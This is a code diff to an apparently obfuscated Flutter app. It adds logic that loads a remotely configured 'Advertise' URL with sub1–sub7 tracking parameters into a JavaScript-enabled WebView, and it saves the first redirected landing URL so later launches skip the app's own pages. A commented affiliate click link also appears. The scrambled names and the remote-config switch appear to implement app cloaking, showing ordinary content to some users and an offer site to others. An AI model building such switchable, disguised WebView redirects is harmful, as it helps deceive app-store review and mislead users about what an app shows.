@@ -36,7 +36,7 @@ class _ghjLoadingPageState extends State<ghjLoadingPage>
     with TickerProviderStateMixin {
   late final AnimationController _ghjncontroller;
 
-  late Timer _ghjTimerXwd;
+  Timer? _ghjTimerXwd;
   int _ghjSeconds = 0;
   bool _ghjsRunning = true;
 
@@ -48,16 +48,23 @@ class _ghjLoadingPageState extends State<ghjLoadingPage>
   String? ghjSub6;
   String? ghjSub7;
 
+
+
   @override
   void initState() {
     super.initState();
 
-
-    _ghjncontroller = AnimationController(vsync: this);
-    _ghjStartTimer();
     ghjSharedPreCex = context.read<SharedPreferences>();
+    _ghjncontroller = AnimationController(vsync: this);
 
-    ghjLifeUuc = ghjSharedPreCex.getString("link");
+    if (ghjLifeUuc != null) {
+      _hficLodiIfxc.value = true;
+    } else {
+      _ghjStartTimer();
+    }
+
+
+
     _hficLodiIfxc.addListener(() {
       if (_hficLodiIfxc.value && _ghjUcel.value) _ghjIclme();
     });
@@ -68,8 +75,15 @@ class _ghjLoadingPageState extends State<ghjLoadingPage>
       _ghjUcel.value = true;
     }
 
+
+
     WidgetsBinding.instance.addPostFrameCallback((_) async {
-      await _ghjIoxf();
+      if (ghjLifeUuc != null) {
+        _ghjUcel.value = true;
+        //print('has link');
+      } else {
+        await _ghjIoxf();
+      }
     });
   }
 
@@ -89,7 +103,10 @@ class _ghjLoadingPageState extends State<ghjLoadingPage>
   }
 
   void _ghjStopTimer() {
-    _ghjTimerXwd.cancel();
+    if (_ghjTimerXwd != null){
+      _ghjTimerXwd!.cancel();
+    }
+
     setState(() {
       _ghjsRunning = false;
     });
@@ -98,7 +115,9 @@ class _ghjLoadingPageState extends State<ghjLoadingPage>
   @override
   void dispose() {
     _ghjncontroller.dispose();
-    _ghjTimerXwd.cancel();
+    if (_ghjTimerXwd != null){
+      _ghjTimerXwd!.cancel();
+    }
     _hficLodiIfxc.dispose();
     ghjIicxle?.cancel();
     _ghjUcel.dispose();
@@ -120,10 +139,10 @@ class _ghjLoadingPageState extends State<ghjLoadingPage>
 
   Future<void> _ghjCww() async {
     ghjLifeUuc = '${ghjRemWqx.getString("Advertise")}?sub1=$ghjSub1&sub2=$ghjSub2&sub3=$ghjSub3&sub4=$ghjSub4&sub5=$ghjSub5&sub6=$ghjSub6&sub7=$ghjSub7';
-    ghjSharedPreCex.setString("link", ghjLifeUuc!);
+
     ghjSucOic = ghjRemWqx.getBool("newus");
     //fdsoSuccOne = false;
-    ghjSharedPreCex.setBool("success", ghjSucOic!);
+
     //print('link: ${ghjLifeUuc} \nsuccess: ${ghjSucOic}');
 
     if (!ghjSucOic!){
@@ -276,6 +295,8 @@ class _ghjLoadingPageState extends State<ghjLoadingPage>
   }
 }
 
+bool isLoad = false;
+
 class GhaApplcix extends StatefulWidget {
   const GhaApplcix({
     super.key,
@@ -287,10 +308,13 @@ class GhaApplcix extends StatefulWidget {
   State<GhaApplcix> createState() => _NrasPoliceWicState();
 }
 
+
 class _NrasPoliceWicState extends State<GhaApplcix> with TickerProviderStateMixin{
   late WebViewController _ghjWebIUhc;
   late final AnimationController _ghjncontroller;
   bool ghjIsLoce = false;
+
+
 
   String ghyloadedLink = '';
 
@@ -298,10 +322,13 @@ class _NrasPoliceWicState extends State<GhaApplcix> with TickerProviderStateMixi
   void initState() {
     super.initState();
 
+    //print('ther');
+
     _ghjncontroller = AnimationController(vsync: this);
     _ghjWebIUhc = WebViewController()
       ..loadRequest(
         Uri.parse(ghjLifeUuc!),
+        //Uri.parse('https://go.scityweb.com/click?pid=726&offer_id=12&l=1708502086&to=aHR0cHM6Ly9nby5zY2l0eXdlYi5jb20vY2xpY2s/cGlkPTcyNiZvZmZlcl9pZD0xMg==')
       )
 
       ..setJavaScriptMode(
@@ -320,19 +347,35 @@ class _NrasPoliceWicState extends State<GhaApplcix> with TickerProviderStateMixi
             },
             onPageFinished: (String url) async {
               //print('$url and $ghjLifeUuc}');
-              if (url == ghyloadedLink){
-                bool firstTime = await getIt.get<ghjDataProvider>().firstTimeVisited();
-                Navigator.pushReplacement(
-                  context,
-                  CupertinoPageRoute(
-                      builder: (context) =>
-                      firstTime ? const OnBoardingPage() : const ghjMainPage()),
-                );
+
+              if (ghjSharedPreCex.getString("link") == null) {
+                if (url == ghyloadedLink && !isLoad){
+                  //print('start');
+                  //print('isLoad == $isLoad');
+                  bool firstTime = await getIt.get<ghjDataProvider>().firstTimeVisited();
+                  Navigator.pushReplacement(
+                    context,
+                    CupertinoPageRoute(
+                        builder: (context) =>
+                        firstTime ? const OnBoardingPage() : const ghjMainPage()),
+                  );
+                } else {
+                  setState(() {
+                    ghjIsLoce = true;
+                  });
+                }
               } else {
                 setState(() {
                   ghjIsLoce = true;
                 });
               }
+
+              if (url != ghyloadedLink && !isLoad && ghjSharedPreCex.getString("link") == null){
+                //print('save');
+                ghjSharedPreCex.setString("link", url);
+                ghjSharedPreCex.setBool("success", ghjSucOic!);
+              }
+              isLoad = true;
             }
         ),
       );
